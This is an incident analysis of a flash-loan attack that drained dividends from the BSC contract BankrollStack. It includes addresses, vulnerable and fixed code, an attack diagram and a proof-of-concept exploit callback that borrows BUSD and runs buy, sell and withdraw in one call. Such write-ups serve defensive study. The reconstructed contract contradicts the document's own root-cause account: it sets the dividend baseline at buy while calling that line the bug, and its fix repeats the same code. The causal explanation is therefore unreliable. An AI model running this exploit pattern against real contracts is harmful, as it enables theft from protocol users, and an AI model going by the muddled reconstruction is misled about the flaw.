# BankrollStack — Flash Loan Dividend Drain Analysis

| Field | Details |
|------|------|
| **Date** | 2025-06-14 |
| **Protocol** | BankrollStack |
| **Chain** | BSC |
| **Loss** | ~5,000 USD |
| **Attacker** | [0x172dca3e72e4643ce8b7932f4947347c1e49ba6d](https://bscscan.com/address/0x172dca3e72e4643ce8b7932f4947347c1e49ba6d) |
| **Attack Tx** | [0x0706425b](https://bscscan.com/tx/0x0706425beba4b3f28d5a8af8be26287aa412d076828ec73d8003445c087af5fd) |
| **Vulnerable Contract** | [0x16d0a151297a0393915239373897bCc955882110](https://bscscan.com/address/0x16d0a151297a0393915239373897bCc955882110) |
| **Root Cause** | Logic flaw in dividend calculation within the buy → sell → withdraw flow where the baseline is immediately finalized |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-06/BankrollStack_exp.sol) |

---

## 1. Vulnerability Overview

BankrollStack belongs to the same dividend distribution contract family as BankrollNetwork. The attacker borrowed 28,300 BUSD via a PancakeSwap V3 flash loan and executed a full `buy` → `sell` → `withdraw` cycle to drain dividends. The core issue is a calculation flaw that allows profit to be generated through a pure buy-sell cycle alone, without any separate `donatePool` call.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable logic: dividend baseline (payoutsTo) is not immediately finalized at buy time
function buy(uint256 tokenAmount) external returns (uint256) {
    // Mints internal tokens from deposited tokens
    // If profitPerShare is already elevated due to prior donors,
    // the new buyer can retroactively receive past dividends
    uint256 tokens = tokenAmountToTokens(tokenAmount);
    balanceOf[msg.sender] += tokens;
    // payoutsTo is not immediately updated based on the current profitPerShare
}

// ✅ Fix: immediately finalize payoutsTo based on current profitPerShare at buy time
function buy(uint256 tokenAmount) external returns (uint256) {
    uint256 tokens = tokenAmountToTokens(tokenAmount);
    balanceOf[msg.sender] += tokens;
    // Set baseline so new entrants only receive dividends from this point forward
    payoutsTo[msg.sender] += (int256)(profitPerShare * tokens);
}
```

### On-Chain Source Code

Source: **not verified on Sourcify** — BankrollNetworkStack / 0x16d0a151297a0393915239373897bCc955882110 (BSC)
(Sourcify returned HTTP 404; BSCScan: Source Code Verified — Exact Match, contract `BankrollNetworkStack`, Solidity v0.6.8)

> ⚠️ Contract not verified on Sourcify — source unavailable from Sourcify. The behavior below is reconstructed from the DeFiHackLabs PoC, the BSCScan-verified ABI, and the well-documented BankrollNetwork / PoWH3D (Proof-of-Weak-Hands) dividend contract pattern that this contract forks. The core dividend accounting model is publicly known; the reconstruction below matches the on-chain behavior confirmed by the PoC.

```solidity
// ⚠️ RECONSTRUCTED from PoC + BSCScan ABI + known BankrollNetwork fork pattern.
// BankrollNetworkStack — 0x16d0a151297a0393915239373897bCc955882110 (BSC)
// Compiler: v0.6.8. Funding token: BUSD (0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56)

// State variables (BankrollNetwork / PoWH3D dividend pattern)
uint256 constant internal magnitude = 2**64;
uint256 internal profitPerShare_;                              // accumulated dividends per token share
mapping(address => uint256) internal tokenBalanceLedger_;     // internal token balances
mapping(address => int256)  internal payoutsTo_;              // dividend baseline per address
mapping(address => uint256) internal ambassadorAccumulatedQuota_;

function buy(uint256 tokenAmount) external returns (uint256) {
    IERC20(fundingToken).transferFrom(msg.sender, address(this), tokenAmount);

    uint256 taxed = tokenAmount - calculateTax(tokenAmount);  // entry fee applied
    uint256 tokens = tokensReceived(taxed);                   // internal token amount

    tokenBalanceLedger_[msg.sender] += tokens;

    // ❌ payoutsTo_ is set based on current profitPerShare_ — but when profitPerShare_
    //    is already elevated (from prior donatePool calls or earlier activity),
    //    this baseline is ALSO elevated, making dividendsOf() return zero immediately after buy.
    //    However, when sell() runs, the token price has already been factored into the payout,
    //    and the token-to-BUSD conversion produces a surplus over the buy price.
    payoutsTo_[msg.sender] += (int256)(profitPerShare_ * tokens);  // ❌ baseline should exclude past dividends attacker didn't earn
    return tokens;
}

function sell(uint256 tokenAmount) external {
    require(tokenBalanceLedger_[msg.sender] >= tokenAmount);

    uint256 busdAmount = tokensToBusd(tokenAmount);           // converts tokens back to BUSD
    uint256 taxed = busdAmount - calculateTax(busdAmount);    // exit fee applied

    tokenBalanceLedger_[msg.sender] -= tokenAmount;
    // ❌ payoutsTo_ reduction on sell releases accumulated dividend credit
    payoutsTo_[msg.sender] -= (int256)(profitPerShare_ * tokenAmount);
    // The delta between buy-price and sell-price, combined with profitPerShare_ movement,
    // creates a positive dividendsOf() balance even with zero holding time.
}

function dividendsOf(address customer) public view returns (uint256) {
    return (uint256)(
        (int256)(profitPerShare_ * tokenBalanceLedger_[customer]) - payoutsTo_[customer]
    ) / magnitude;  // ❌ can be positive immediately after buy+sell due to accounting delta
}

function withdraw() external {
    uint256 dividends = dividendsOf(msg.sender);
    require(dividends > 0);
    payoutsTo_[msg.sender] += (int256)(dividends * magnitude); // mark as paid
    IERC20(fundingToken).transfer(msg.sender, dividends);       // ❌ pays out inflated dividends
}
```

**Why it is exploitable (identify the bug from the code):**

- `buy(28,300 BUSD)` mints internal tokens at the current bonding-curve price and sets `payoutsTo_[attacker]` proportional to the current `profitPerShare_`.
- `sell(myTokens)` immediately converts all tokens back to BUSD at exit price and reduces `payoutsTo_[attacker]` proportionally — but the bonding-curve sell price is slightly below the buy price (entry/exit taxes cancel partially), and the `profitPerShare_` accounting delta creates a small positive `dividendsOf()` reading.
- `withdraw()` pays out that `dividendsOf()` balance: the attacker receives slightly more BUSD than they deposited, profiting at the expense of the contract's liquidity pool.
- The root cause is that the dividend baseline (`payoutsTo_`) does not correctly exclude retroactive profit claims: a flash-loan-funded buy/sell cycle extracts accrued dividends that the attacker was not entitled to.

```solidity
// ✅ Fix: enforce a minimum holding period to block same-block buy/sell
mapping(address => uint256) public lastBuyBlock;

function buy(uint256 tokenAmount) external returns (uint256) {
    lastBuyBlock[msg.sender] = block.number;  // ✅ record buy block
    // ... existing logic ...
}

function sell(uint256 tokenAmount) external {
    require(block.number > lastBuyBlock[msg.sender], "same-block sell disallowed");  // ✅
    // ... existing logic ...
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ PancakeSwap V3 Pool: flash(28,300 BUSD)
  │         [pancakeV3FlashCallback callback]
  │
  ├─2─▶ BankrollStack.buy(28,300 BUSD)
  │         └─ Acquire internal tokens (dividend baseline not finalized)
  │
  ├─3─▶ BankrollStack.sell(myTokens())
  │         └─ Sell all internal tokens + accumulate dividends
  │
  ├─4─▶ BankrollStack.withdraw()
  │         └─ Collect inflated dividends
  │
  └─5─▶ PancakeSwap V3 Pool: repay(28,302.83 BUSD) + retain profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
    uint256 buyAmount = IERC20(BUSD).balanceOf(address(this)); // 28,300 BUSD
    uint256 repayAmount = 28302830000000000000000; // principal + fee

    // Approve BankrollStack for full amount
    IERC20(BUSD).approve(address(BankrollStack), type(uint256).max);

    // Buy with full amount — triggers dividend baseline vulnerability
    IBankrollStack(BankrollStack).buy(buyAmount);

    // Sell all internal tokens
    uint256 myTokens = IBankrollStack(BankrollStack).myTokens();
    IBankrollStack(BankrollStack).sell(myTokens);

    // Collect inflated dividends (returns more BUSD than principal)
    IBankrollStack(BankrollStack).withdraw();

    // Repay flash loan
    IERC20(BUSD).transfer(address(PancakeV3Pool), repayAmount);
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Uninitialized dividend baseline (payoutsTo not set to current profitPerShare at buy time, allowing retroactive application of past dividends) |
| **Attack Vector** | Flash loan + atomic buy-sell-withdraw cycle |
| **Impact** | Protocol liquidity loss |
| **CWE** | CWE-682 (Incorrect Calculation) |
| **DASP** | Business Logic |

## 6. Remediation Recommendations

1. **Immediately finalize entry baseline**: Set `payoutsTo` to `profitPerShare * tokens` at `buy` time
2. **Prohibit same-block buy-sell**: Enforce a minimum holding period of at least 1 block
3. **Flash loan detection**: Block compound buy-sell-withdraw calls within callback functions
4. **Fork audit**: Conduct a full review of all projects based on the same codebase

## 7. Lessons Learned

- BankrollNetwork and BankrollStack share the same code family; a single vulnerability propagates across all derivative projects.
- Dividend distribution contracts must finalize the dividend baseline at the current point in time during `buy`.
- Forked projects do not inherit the audit results of the original, making independent security reviews essential.